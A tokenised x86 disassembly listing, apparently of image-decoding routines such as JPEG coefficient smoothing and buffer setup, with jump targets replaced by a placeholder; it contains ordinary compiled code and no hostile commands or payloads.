mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] edx
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x90 ]
cmp ecx [ eax + 0x98 ]
jbe r-xdata
add esp 0x2c
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov eax [ ecx + 0x20 ]
cmp eax [ esp + 0xc ]
jg r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx [ esp ]
inc [ edx + 0x98 ]
mov ecx [ edx + 0x98 ]
mov eax [ esp ]
cmp ecx [ eax + 0x132 ]
jae r-xdata
add [ esp + 0x20 ] 0x4
add [ esp + 0x24 ] 0x4
inc [ esp + 0xc ]
add ebx 0x54
mov eax [ ebx + 0xc ]
push eax
push 0x0
mov edx [ esp + 0x8 ]
mov ecx [ edx + 0x98 ]
imul ecx eax
mov eax [ esp + 0x28 ]
mov edx [ eax ]
mov eax [ esp + 0x8 ]
mov esi [ eax + 0x4 ]
call [ esi + 0x20 ]
mov ecx eax
mov eax [ esp ]
mov edx [ eax + 0x98 ]
cmp edx [ esp + 0x4 ]
jae r-xdata
mov eax 0x4
mov eax 0x3
jmp r-xdata
mov eax [ ebx + 0x20 ]
mov esi [ ebx + 0xc ]
xor edx edx
div esi
mov [ esp + 0x14 ] edx
cmp [ esp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x1b2 ]
mov edx [ esp + 0xc ]
mov eax [ eax + edx * 4 + 0x4 ]
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x24 ]
mov eax [ edx ]
mov [ esp + 0x18 ] eax
xor edx edx
mov [ esp + 0x10 ] edx
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x14 ]
jge r-xdata
mov [ esp + 0x14 ] esi
mov edx [ esp + 0x28 ]
xor edi edi
xor eax eax
mov esi [ edx ]
mov [ esp + 0x8 ] eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx [ ebx + 0x1c ]
jb r-xdata
mov edx [ esp + 0x18 ]
mov ecx esi
push edx
push edi
mov eax [ esp + 0x8 ]
mov edx ebx
call [ esp + 0x24 ]
add esi 0x80
add edi [ ebx + 0x24 ]
inc [ esp + 0x8 ]
mov eax [ ebx + 0x24 ]
shl eax 0x2
add [ esp + 0x18 ] eax
inc [ esp + 0x10 ]
add [ esp + 0x28 ] 0x4
mov edx [ esp + 0x10 ]
cmp edx [ esp + 0x14 ]
jl r-xdata
sub_460cb4
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] eax
mov eax [ esp ]
mov ebx [ eax + 0x19e ]
xor eax eax
mov [ esp + 0x4 ] eax
mov edx [ esp ]
cmp [ edx + 0xd8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x9c ] 0x0
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
mov eax [ esp ]
mov esi [ ebx + 0x70 ]
xor ebx ebx
mov edx [ eax + 0xd4 ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x20 ]
mov esi [ eax + 0x4 ]
shl ecx 0x3
mov edx 0x1
lea ecx [ ecx + ecx * 2 ]
call [ esi ]
mov [ ebx + 0x70 ] eax
mov eax [ esp ]
cmp ebx [ eax + 0x20 ]
jl r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2 ] 0x0
je r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
cmp [ eax + 0x12 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov edx [ esp ]
mov eax [ edx + 0x9c ]
mov edx ebx
shl edx 0x8
add eax edx
cmp [ eax ] 0x0
jge r-xdata
mov ecx 0x1
lea edx [ esi + 0x4 ]
add eax 0x4
xor eax eax
jmp r-xdata
inc ecx
add edx 0x4
add eax 0x4
cmp ecx 0x5
jle r-xdata
mov [ esp + 0x4 ] 0x1
mov edi [ eax ]
mov [ edx ] edi
cmp [ eax ] 0x0
je r-xdata
add esi 0x18
inc ebx
add [ esp + 0x8 ] 0x54
sub_460dc4
push ebx
push esi
add esp 0xfffffee8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x19e ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x132 ]
dec eax
mov [ esp + 0xc ] eax
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x94 ]
cmp ecx [ eax + 0x8c ]
jl r-xdata
xor eax eax
mov [ esp + 0x18 ] eax
mov edx [ esp ]
mov ecx [ edx + 0xd4 ]
mov [ esp + 0x40 ] ecx
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1a6 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ eax + 0x20 ]
cmp edx [ esp + 0x18 ]
jg r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x94 ]
cmp ecx [ eax + 0x8c ]
jne r-xdata
mov eax [ esp + 0x40 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ esp ]
inc [ ecx + 0x98 ]
mov eax [ ecx + 0x98 ]
mov edx [ esp ]
cmp eax [ edx + 0x132 ]
jae r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1a6 ]
call [ edx ]
test eax eax
jne r-xdata
mov edx 0x1
mov ecx [ esp ]
cmp [ ecx + 0x182 ] 0x0
je r-xdata
inc [ esp + 0x18 ]
add [ esp + 0x40 ] 0x54
mov edx [ esp ]
mov ecx [ edx + 0x98 ]
cmp ecx [ esp + 0xc ]
jae r-xdata
mov eax 0x4
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ esp + 0x90 ] edx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x90 ]
mov eax [ ecx + 0x98 ]
add eax [ esp + 0x90 ]
cmp edx eax
ja r-xdata
dec edx
mov edx [ esp + 0x40 ]
mov eax [ edx + 0x20 ]
mov edx [ esp + 0x40 ]
mov ecx [ edx + 0xc ]
xor edx edx
div ecx
mov [ esp + 0x20 ] edx
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax [ esp + 0x40 ]
mov edx [ eax + 0xc ]
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x20 ]
add ecx ecx
mov [ esp + 0x24 ] ecx
xor eax eax
mov [ esp + 0x4c ] eax
jmp r-xdata
add esp 0x118
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x4c ] 0x1
mov eax [ esp + 0x40 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x20 ] eax
mov ecx [ esp ]
cmp [ ecx + 0x98 ] 0x0
jbe r-xdata
mov eax [ esp + 0x24 ]
push eax
push 0x0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x10 ]
mov ebx [ eax + 0x4 ]
mov edx [ edx + ecx * 4 + 0x48 ]
xor ecx ecx
call [ ebx + 0x20 ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x48 ] 0x1
mov eax [ esp + 0x40 ]
mov edx [ eax + 0xc ]
add [ esp + 0x24 ] edx
mov ecx [ esp + 0x24 ]
push ecx
push 0x0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x48 ]
mov ecx [ eax + 0x98 ]
mov eax [ esp + 0x10 ]
dec ecx
imul ecx [ edx + 0xc ]
mov edx [ esp + 0x20 ]
mov edx [ eax + edx * 4 + 0x48 ]
mov eax [ esp + 0x8 ]
mov ebx [ eax + 0x4 ]
call [ ebx + 0x20 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x40 ]
mov edx [ eax + 0xc ]
shl edx 0x2
add [ esp + 0x28 ] edx
xor ecx ecx
mov [ esp + 0x48 ] ecx
jmp r-xdata
mov edx [ esp + 0x94 ]
mov ecx [ edx ]
mov [ esp + 0x2c ] ecx
cmp [ esp + 0x48 ] 0x0
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x8 ]
shl ecx 0x3
mov edx [ eax + 0x70 ]
lea ecx [ ecx + ecx * 2 ]
add edx ecx
mov [ esp + 0x50 ] edx
mov eax [ esp + 0x40 ]
mov edx [ eax + 0x4c ]
mov [ esp + 0x54 ] edx
mov ecx [ esp + 0x54 ]
movzx eax [ ecx ]
mov [ esp + 0x58 ] eax
mov edx [ esp + 0x54 ]
movzx ecx [ edx + 0x2 ]
mov [ esp + 0x5c ] ecx
mov eax [ esp + 0x54 ]
movzx edx [ eax + 0x10 ]
mov [ esp + 0x64 ] edx
mov ecx [ esp + 0x54 ]
movzx eax [ ecx + 0x20 ]
mov [ esp + 0x6c ] eax
mov edx [ esp + 0x54 ]
movzx ecx [ edx + 0x12 ]
mov [ esp + 0x68 ] ecx
mov eax [ esp + 0x54 ]
movzx edx [ eax + 0x4 ]
mov [ esp + 0x60 ] edx
mov ecx [ esp ]
mov edx [ esp + 0x18 ]
mov eax [ ecx + 0x1b2 ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ esp + 0x44 ] ecx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x18 ]
mov ecx [ eax + edx * 4 ]
xor eax eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x28 ]
mov ecx edx
mov [ esp + 0x94 ] ecx
mov eax [ esp + 0x1c ]
cmp eax [ esp + 0x20 ]
jge r-xdata
mov edx [ esp + 0x94 ]
mov ecx [ edx - 0x4 ]
mov [ esp + 0x30 ] ecx
cmp [ esp + 0x1c ] 0x0
jne r-xdata
mov ecx [ esp + 0x94 ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x20 ]
dec eax
cmp eax [ esp + 0x1c ]
jne r-xdata
mov eax [ esp + 0x2c ]
mov [ esp + 0x30 ] eax
jmp r-xdata
mov eax [ esp + 0x40 ]
mov edx [ eax + 0x24 ]
shl edx 0x2
add [ esp + 0x38 ] edx
inc [ esp + 0x1c ]
add [ esp + 0x94 ] 0x4
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0x20 ]
jl r-xdata
lea edx [ esp + 0x98 ]
mov ecx 0x1
mov eax [ esp + 0x2c ]
call sub_4644dc
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x14 ]
jae r-xdata
mov edx [ esp + 0x2c ]
mov [ esp + 0x34 ] edx
jmp r-xdata
cmp [ esp + 0x4c ] 0x0
je r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x4 ]
test ebx ebx
je r-xdata
mov edx [ esp + 0x30 ]
movsx ecx [ edx + 0x80 ]
mov [ esp + 0x78 ] ecx
mov eax [ esp + 0x2c ]
movsx edx [ eax + 0x80 ]
mov [ esp + 0x80 ] edx
mov ecx [ esp + 0x34 ]
movsx eax [ ecx + 0x80 ]
mov [ esp + 0x8c ] eax
mov edx [ esp + 0x30 ]
movsx ecx [ edx ]
mov [ esp + 0x78 ] ecx
mov [ esp + 0x74 ] ecx
mov [ esp + 0x70 ] ecx
mov eax [ esp + 0x2c ]
movsx edx [ eax ]
mov [ esp + 0x80 ] edx
mov [ esp + 0x7c ] edx
mov eax [ esp + 0x34 ]
mov esi edx
movsx edx [ eax ]
mov [ esp + 0x8c ] edx
mov [ esp + 0x88 ] edx
mov [ esp + 0x84 ] edx
xor eax eax
mov [ esp + 0x3c ] eax
xor edx edx
mov ecx [ esp + 0x40 ]
mov eax [ ecx + 0x1c ]
dec eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x10 ]
cmp ecx [ esp + 0x14 ]
ja r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x8 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x9a ] 0x0
jne r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0xc ]
test ebx ebx
je r-xdata
cmp [ esp + 0xa8 ] 0x0
jne r-xdata
mov ecx esi
sub ecx [ esp + 0x80 ]
imul ecx [ esp + 0x58 ]
shl ecx 0x2
lea ecx [ ecx + ecx * 8 ]
test ecx ecx
jl r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esp + 0xb8 ] 0x0
jne r-xdata
mov eax [ esp + 0x74 ]
sub eax [ esp + 0x88 ]
imul [ esp + 0x58 ]
mov ecx eax
shl ecx 0x2
lea ecx [ ecx + ecx * 8 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x5c ]
mov edx [ esp + 0x5c ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x5c ]
mov edx [ esp + 0x5c ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x14 ]
test ebx ebx
je r-xdata
cmp [ esp + 0xaa ] 0x0
jne r-xdata
mov eax [ esp + 0x74 ]
mov edx [ esp + 0x7c ]
add eax [ esp + 0x88 ]
add edx edx
sub eax edx
imul [ esp + 0x58 ]
lea ecx [ eax + eax * 8 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x64 ]
mov edx [ esp + 0x64 ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x64 ]
mov edx [ esp + 0x64 ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0x9a ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov edx [ esp + 0x38 ]
push edx
mov eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0xa0 ]
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4c ]
mov edx [ esp + 0x74 ]
mov [ esp + 0x70 ] edx
mov ecx [ esp + 0x78 ]
mov [ esp + 0x74 ] ecx
mov esi [ esp + 0x7c ]
mov eax [ esp + 0x80 ]
mov [ esp + 0x7c ] eax
mov edx [ esp + 0x88 ]
mov [ esp + 0x84 ] edx
mov ecx [ esp + 0x8c ]
mov [ esp + 0x88 ] ecx
add [ esp + 0x2c ] 0x80
add [ esp + 0x30 ] 0x80
add [ esp + 0x34 ] 0x80
mov eax [ esp + 0x40 ]
mov edx [ eax + 0x24 ]
add [ esp + 0x3c ] edx
inc [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ esp + 0x14 ]
jbe r-xdata
cmp [ esp + 0x9c ] 0x0
jne r-xdata
mov eax [ esp + 0x70 ]
sub eax [ esp + 0x78 ]
sub eax [ esp + 0x84 ]
add eax [ esp + 0x8c ]
imul [ esp + 0x58 ]
lea ecx [ eax + eax * 4 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x6c ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x6c ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0xa8 ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
add esi [ esp + 0x80 ]
mov eax [ esp + 0x7c ]
add eax eax
sub esi eax
imul esi [ esp + 0x58 ]
lea ecx [ esi + esi * 8 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x68 ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x68 ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0xb8 ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
mov eax [ esp + 0x60 ]
mov edx [ esp + 0x60 ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x60 ]
mov edx [ esp + 0x60 ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0xaa ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0x9c ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
sub_461590
push ebx
push esi
push edi
mov edi eax
mov eax edi
push ebp
mov ebx edx
mov edx 0x1
mov esi [ eax + 0x4 ]
add esp 0xfffffff4
mov ecx 0x74
call [ esi ]
mov esi eax
xor eax eax
mov [ edi + 0x19e ] esi
test ebx ebx
mov [ esi ] sub_460654
mov [ esi + 0x8 ] sub_460664
mov [ esi + 0x70 ] eax
je r-xdata
mov eax edi
mov ecx 0x500
mov edx 0x1
mov ebx [ eax + 0x4 ]
call [ ebx + 0x4 ]
mov ecx eax
xor eax eax
lea edx [ esi + 0x20 ]
xor edx edx
mov [ esp ] edx
mov ebx [ edi + 0xd4 ]
lea eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
jmp r-xdata
mov ebx eax
inc eax
shl ebx 0x7
add ebx ecx
mov [ edx ] ebx
add edx 0x4
cmp eax 0xa
jl r-xdata
mov [ esi + 0x4 ] sub_4608f0
mov [ esi + 0xc ] sub_4606a0
xor eax eax
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov [ esp + 0x4 ] edx
cmp [ edi + 0xd8 ] 0x0
je r-xdata
mov [ esi + 0x4 ] sub_4608f4
mov [ esi + 0xc ] sub_460ae4
lea ecx [ esi + 0x48 ]
mov [ esi + 0x10 ] ecx
jmp r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x1c ]
call sub_464478
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x20 ]
call sub_464478
push eax
mov eax edi
mov ecx [ esp + 0xc ]
mov edx 0x1
push ecx
mov ecx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x14 ]
mov edx [ esp + 0x8 ]
mov [ edx ] eax
add [ esp + 0x8 ] 0x4
inc [ esp ]
add ebx 0x54
mov ecx [ esp + 0x4 ]
lea ecx [ ecx + ecx * 2 ]
mov [ esp + 0x4 ] ecx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4616a4
push ebx
push esi
mov esi eax
sub edx 0x1
mov ebx [ esi + 0x1a2 ]
jb r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi + 0x1b6 ]
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
jmp r-xdata
mov [ ebx + 0x4 ] sub_46174c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec edx
je r-xdata
xor ecx ecx
mov [ ebx + 0x18 ] ecx
mov [ ebx + 0x14 ] ecx
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
xor ecx ecx
push eax
mov eax esi
push 0x1
mov esi [ eax + 0x4 ]
mov edx [ ebx + 0x8 ]
call [ esi + 0x1c ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov [ ebx + 0x4 ] sub_46186c
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebx + 0x4 ] sub_4617c8
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
sub_46174c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x1a2 ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
pop ecx
sub eax ecx
mov ecx [ ebx + 0x10 ]
cmp eax ecx
jbe r-xdata
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebx + 0xc ]
push ecx
lea ecx [ ebp - 0xc ]
push ecx
push eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1b6 ]
call [ esi + 0x4 ]
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx ]
mov edx [ ebx + 0xc ]
shl ecx 0x2
mov ebx [ eax + 0x1be ]
add ecx [ ebp + 0x10 ]
call [ ebx + 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax ecx
sub_4617c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x1a2 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
lea eax [ ebx + 0x18 ]
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebx + 0xc ]
push ecx
push eax
mov eax esi
mov edx [ ebx + 0x10 ]
push edx
mov edi [ eax + 0x1b6 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call [ edi + 0x4 ]
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0xc ]
jbe r-xdata
mov eax [ ebx + 0x10 ]
push eax
mov eax esi
push 0x1
mov edi [ eax + 0x4 ]
mov ecx [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
call [ edi + 0x1c ]
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
cmp eax [ ebx + 0x18 ]
ja r-xdata
sub eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax esi
mov edx [ ebp - 0x10 ]
push edx
mov edx [ ebp - 0xc ]
mov esi [ eax + 0x1be ]
shl edx 0x2
add edx [ ebx + 0xc ]
xor ecx ecx
call [ esi + 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
add [ ebx + 0x14 ] eax
xor edx edx
mov [ ebx + 0x18 ] edx
sub_46186c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x1a2 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebx + 0x10 ]
mov edx [ ebx + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
pop ecx
sub eax ecx
sub esi edx
cmp eax esi
jae r-xdata
mov eax [ ebx + 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
mov esi [ eax + 0x4 ]
call [ esi + 0x1c ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
sub eax [ ebx + 0x14 ]
cmp eax esi
jae r-xdata
mov esi eax
push esi
mov eax [ ebp + 0xc ]
shl edx 0x2
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
shl ecx 0x2
add ecx [ ebp + 0x10 ]
add edx [ ebx + 0xc ]
mov edi [ eax + 0x1be ]
call [ edi + 0x4 ]
mov eax [ ebp + 0xc ]
add [ eax ] esi
add [ ebx + 0x18 ] esi
mov eax [ ebx + 0x10 ]
cmp eax [ ebx + 0x18 ]
ja r-xdata
mov esi eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
add [ ebx + 0x14 ] eax
xor edx edx
mov [ ebx + 0x18 ] edx
sub_461904
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ecx
mov [ esp ] edx
mov edx 0x1
mov ebx [ eax + 0x4 ]
mov ecx 0x1c
call [ ebx ]
mov ebx eax
xor eax eax
mov [ esi + 0x1a2 ] ebx
xor edx edx
mov [ ebx ] sub_4616a4
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
cmp [ esi + 0x50 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x12a ]
mov [ ebx + 0x10 ] edi
cmp [ esp ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx 0x1
push eax
mov eax esi
mov ecx [ esi + 0x6c ]
imul ecx [ esi + 0x74 ]
mov esi [ eax + 0x4 ]
call [ esi + 0x8 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x6c ]
imul [ esi + 0x74 ]
push eax
mov edx edi
mov eax [ esi + 0x70 ]
call sub_464478
push eax
mov eax esi
mov edx [ ebx + 0x10 ]
xor ecx ecx
push edx
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi + 0x10 ]
mov [ ebx + 0x8 ] eax
jmp r-xdata
sub_461998
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
xor edx edx
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
mov eax [ eax + 0x1b2 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] ecx
xor edx edx
mov [ esp + 0x4 ] edx
add eax 0x4
mov ecx [ esp ]
mov edx [ ecx + 0xd4 ]
mov [ esp + 0x8 ] edx
mov [ esp + 0x20 ] eax
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x20 ]
cmp eax [ esp + 0x4 ]
jg r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x24 ]
dec eax
je r-xdata
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x10 ] sub_4628f0
xor edx edx
mov [ esp + 0xc ] edx
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
mov [ ecx ] eax
mov edx [ esp + 0x8 ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov [ esp + 0x10 ] sub_462714
xor ecx ecx
mov [ esp + 0xc ] ecx
jmp r-xdata
sub eax 0x2
je r-xdata
add [ esp + 0x20 ] 0x4
inc [ esp + 0x4 ]
add [ esp + 0x8 ] 0x54
mov ecx [ esp + 0x20 ]
mov eax [ ecx + 0x28 ]
cmp eax [ esp + 0xc ]
je r-xdata
mov [ esp + 0x10 ] sub_462380
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
sub eax 0x4
je r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ edx + 0x4c ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x44 ]
sub ecx 0x1
jb r-xdata
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0xc ]
mov [ eax + 0x28 ] edx
mov ecx [ esp + 0xc ]
sub ecx 0x1
jb r-xdata
mov [ esp + 0x10 ] sub_46c018
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
je r-xdata
mov ecx [ esp ]
mov eax [ ecx ]
mov [ eax + 0x14 ] 0x6
mov edx [ esp + 0x8 ]
mov ecx [ edx + 0x24 ]
mov [ eax + 0x18 ] ecx
